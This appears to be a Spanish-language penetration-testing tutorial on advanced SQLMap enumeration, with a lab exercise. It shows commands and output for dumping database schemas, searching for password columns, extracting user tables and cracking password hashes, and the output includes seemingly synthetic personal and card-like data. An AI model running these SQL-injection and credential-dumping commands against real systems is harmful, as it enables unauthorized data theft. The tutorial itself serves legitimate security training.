
# SQLMap - Enumeración Avanzada

Ahora que hemos cubierto los conceptos básicos de la enumeración de bases de datos con SQLMap, cubriremos técnicas más avanzadas para enumerar datos de interés en esta sección.

***

## Enumeración del esquema de base de datos

Si quisiéramos recuperar la estructura de todas las tablas para poder tener una visión completa de la arquitectura de la base de datos, podríamos usar el modificador `--schema`:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --schema

...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
...
Database: testdb
Table: data
[2 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| content | blob    |
| id      | int(11) |
+---------+---------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```

***

## Buscando datos

Cuando trabajamos con estructuras de bases de datos complejas con numerosas tablas y columnas, podemos buscar bases de datos, tablas y columnas de interés mediante la opción `--search` . Esta opción nos permite buscar nombres de identificadores mediante el operador `LIKE` . Por ejemplo, si buscamos todos los nombres de tablas que contienen la palabra clave `user`, podemos ejecutar SQLMap de la siguiente manera:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --search -T user

...SNIP...
[14:24:19] [INFO] searching tables LIKE 'user'
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master
[1 table]
+-----------------+
| users           |
+-----------------+

Database: information_schema
[1 table]
+-----------------+
| USER_PRIVILEGES |
+-----------------+

Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+

do you want to dump found table(s) entries? [Y/n] 
...SNIP...
```

En el ejemplo anterior, podemos detectar inmediatamente un par de objetivos de recuperación de datos interesantes en función de estos resultados de búsqueda. También podríamos haber intentado buscar todos los nombres de columnas en función de una palabra clave específica (por ejemplo, `pass`):

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

...SNIP...
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+

Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

Database: mysql
Table: user
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(41) |
+----------+----------+

Database: mysql
Table: servers
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(64) |
+----------+----------+
```

***

## <mark style="color:purple;">Enumeración y descifrado de contraseñas</mark>

Una vez que identificamos una tabla que contiene contraseñas (por ejemplo `master.users`), podemos recuperar esa tabla con la opción `-T`, como se mostró anteriormente:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

...SNIP...
[14:31:41] [INFO] fetching columns for table 'users' in database 'master'
[14:31:41] [INFO] fetching entries for table 'users' in database 'master'
[14:31:41] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N

do you want to crack them via a dictionary-based attack? [Y/n/q] Y

[14:31:41] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:31:41] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

[14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[14:31:41] [INFO] starting 8 processes 
[14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                                                         
[14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                                                         
...SNIP...
[14:31:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'                                                                                                        
Database: master                                                                                                                                                                                          
Table: users
[32 entries]
+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| id | cc               | name              | email                       | phone        | address                | birthday          | password                                                    | occupation                                        |
+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
| 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10945aa229a6d569f226976b22ea0e900a1fc219 (taqris)           | Agricultural product sorter                       |
| 3  | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
| 4  | 4929811432072262 | Gregory Stumbaugh | GregoryBStumbaugh@yahoo.com | 410-680-5653 | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
| 5  | 4539646911423277 | Bobby Granger     | BobbyJGranger@gmail.com     | 212-696-1812 | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
| 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
| 7  | 5503989023993848 | Dean Harper       | DeanLHarper@yahoo.com       | 440-847-8376 | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
| 8  | 4556586478396094 | Gabriela Waite    | GabrielaRWaite@msn.com      | 732-638-1529 | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
```

En el ejemplo anterior, podemos ver que SQLMap tiene capacidades automáticas de descifrado de hashes de contraseñas. Al recuperar cualquier valor que se parezca a un formato de hash conocido, SQLMap nos solicita que realicemos un ataque basado en diccionarios sobre los hashes encontrados.

Los ataques de descifrado de hash se realizan de forma multiprocesadora, en función de la cantidad de núcleos disponibles en el equipo del usuario. Actualmente, se ha implementado un soporte para descifrar 31 tipos diferentes de algoritmos de hash, con un diccionario incluido que contiene 1,4 millones de entradas (compiladas a lo largo de los años con las entradas más comunes que aparecen en filtraciones de contraseñas disponibles públicamente). Por lo tanto, si un hash de contraseña no se elige al azar, existe una buena probabilidad de que SQLMap lo descifre automáticamente.

***

## <mark style="color:purple;">Enumeración y descifrado de contraseñas de usuarios de bases de datos</mark>

Además de las credenciales de usuario que se encuentran en las tablas de la base de datos, también podemos intentar volcar el contenido de las tablas del sistema que contienen credenciales específicas de la base de datos (por ejemplo, credenciales de conexión). Para facilitar todo el proceso, SQLMap tiene un modificador especial `--passwords` diseñado especialmente para esta tarea:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch

...SNIP...
[14:25:20] [INFO] fetching database users password hashes
[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'debian-sys-maint'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N

do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y

[14:25:20] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:25:20] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)
[14:25:20] [INFO] starting 8 processes 
[14:25:26] [INFO] cracked password 'testpass' for user 'root'
database management system users password hashes:

[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass

[14:25:28] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 14:25:28 /2020-09-18/
```

{% hint style="info" %}
**Consejo**: El interruptor '`--all`' en combinación con el interruptor '`--batch`' realizará automáticamente todo el proceso de enumeración en el destino mismo y proporcionará todos los detalles de la enumeración.
{% endhint %}

Básicamente, esto significa que se recuperará todo lo que esté accesible, lo que podría durar mucho tiempo. Necesitaremos encontrar los datos de interés en los archivos de salida de forma manual.

***

## Ejercicio

```
Objetivo: 83.136.254.226:52864
```

### Pregunta 1

¿Cuál es el nombre de la columna que contiene la palabra "style" en su nombre? (Caso n.° 1)

```shell-session
afsh4ck@kali$ sqlmap -u "http://83.136.254.226:52864/case1.php?id=1" --search -C style
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:48:46 /2024-08-13/

[19:48:46] [INFO] resuming back-end DBMS 'mysql' 
[19:48:46] [INFO] testing connection to the target URL
<------SNIP------>
[19:48:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
do you want sqlmap to consider provided column(s):
[1] as LIKE column names (default)
[2] as exact column names
> 1
[19:48:48] [INFO] searching columns LIKE 'style' across all databases
[19:48:48] [WARNING] potential permission problems detected ('command denied')
[19:48:48] [INFO] fetching columns LIKE 'style' for table 'ROUTINES' in database 'information_schema'
columns LIKE 'style' were found in the following databases:
Database: information_schema
Table: ROUTINES
[1 column]
+-----------------+------------+
| Column          | Type       |
+-----------------+------------+
| PARAMETER_STYLE | varchar(8) |
+-----------------+------------+
```

### Pregunta 2

¿Cuál es la contraseña del usuario Kimberly? (Caso #1)

#### Obtener las bases de datos

```shell-session
afsh4ck@kali$ sqlmap -u "http://83.136.254.226:52864/case1.php?id=1" --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:57:01 /2024-08-13/

[19:57:01] [INFO] resuming back-end DBMS 'mysql' 
[19:57:01] [INFO] testing connection to the target URL
[19:57:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:57:02] [INFO] fetching database names
[19:57:02] [WARNING] potential permission problems detected ('command denied')
available databases [2]:
[*] information_schema
[*] testdb
```

#### Enumerar tablas de la base de datos testdb

```shell-session
afsh4ck@kali$ sqlmap -u "http://83.136.254.226:52864/case1.php?id=1" -D testdb --tables 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:59:49 /2024-08-13/

[19:59:49] [INFO] resuming back-end DBMS 'mysql' 
[19:59:49] [INFO] testing connection to the target URL
[19:59:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:59:49] [INFO] fetching tables for database: 'testdb'
[19:59:49] [WARNING] potential permission problems detected ('command denied')
Database: testdb
[2 tables]
+-------+
| flag1 |
| users |
+-------+
```

#### Enumerar la tabla users

```shell-session
afsh4ck@kali$ sqlmap -u "http://83.136.254.226:52864/case1.php?id=1" -D testdb -T users --columns
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:03:23 /2024-08-13/

[20:03:23] [INFO] resuming back-end DBMS 'mysql' 
[20:03:23] [INFO] testing connection to the target URL
[20:03:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:03:23] [INFO] fetching columns for table 'users' in database 'testdb'
[20:03:23] [WARNING] potential permission problems detected ('command denied')
Database: testdb
Table: users
[9 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| name       | varchar(512) |
| address    | varchar(512) |
| birthday   | varchar(512) |
| cc         | varchar(512) |
| email      | varchar(512) |
| id         | int(11)      |
| occupation | varchar(512) |
| password   | varchar(512) |
| phone      | varchar(512) |
+------------+--------------+
```

#### Enumerar columnas name y password del usuario Kimberly

```shell-session
afsh4ck@kali$ sqlmap -u "http://83.136.254.226:52864/case1.php?id=1" -D testdb -T users -C name,password --dump --where="name LIKE 'kim%'"
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:10:12 /2024-08-13/

[20:10:12] [INFO] resuming back-end DBMS 'mysql' 
[20:10:12] [INFO] testing connection to the target URL
[20:10:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:10:13] [INFO] fetching entries of column(s) '`name`,password' for table 'users' in database 'testdb'
[20:10:13] [WARNING] potential permission problems detected ('command denied')
[20:10:13] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[20:10:18] [INFO] using hash method 'sha1_generic_passwd'
[20:10:18] [INFO] resuming password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
Database: testdb
Table: users
[1 entry]
+-----------------+--------------------------------------------------------+
| name            | password                                               |
+-----------------+--------------------------------------------------------+
| Kimberly Wright | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609) |
+-----------------+--------------------------------------------------------+
```
